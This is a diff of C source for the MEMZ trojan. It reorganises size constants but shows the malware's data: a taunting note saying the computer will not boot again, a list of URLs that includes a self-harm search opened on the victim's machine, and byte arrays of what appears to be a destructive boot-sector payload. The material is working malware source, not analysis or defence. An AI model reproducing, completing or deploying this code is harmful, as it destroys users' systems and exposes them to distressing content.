@@ -2,8 +2,6 @@
 
 const char note[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it. :D";
 
-const size_t note_size = sizeof(note);
-
 const char* sites[] =
 {
     "http://google.co.ck/search?q=best+way+to+kill+yourself",
@@ -54,16 +52,12 @@ const char* sites[] =
     "mmc",
 };
 
-const size_t sites_size = sizeof(sites) / sizeof(char*);
-
 const char* sounds[] =
 {
     "SystemHand",
     "SystemQuestion",
-    "SystemExclamation"
+    "SystemExclamation",
 };
-
-const size_t sounds_size = sizeof(sounds) / sizeof(void *);
 
 const char* messages[] =
 {
@@ -95,9 +89,6 @@ const char* messages[] =
     "'Uh, Club Penguin. Time to get banned!'\r\n - danooct1 2016",
     "Now with cleaner code base by rcktscnc!",
 };
-
-const size_t messages_size = sizeof(messages) / sizeof(void *);
-
 
 const unsigned char code1[] = {
     0xBB, 0xE0, 0x07, 0x8E, 0xC3, 0x8E, 0xDB, 0xB8, 0x04, 0x02, 0xB9, 0x02,
@@ -294,5 +285,9 @@ const unsigned char code2[] = {
     0x6E, 0x20, 0x43, 0x61, 0x74, 0x2E, 0x2E, 0x2E
 };
 
+const size_t note_size = sizeof(note);
+const size_t sites_size = sizeof(sites) / sizeof(char*);
+const size_t sounds_size = sizeof(sounds) / sizeof(void *);
+const size_t messages_size = sizeof(messages) / sizeof(void *);
 const size_t code1_size = sizeof(code1);
 const size_t code2_size = sizeof(code2);
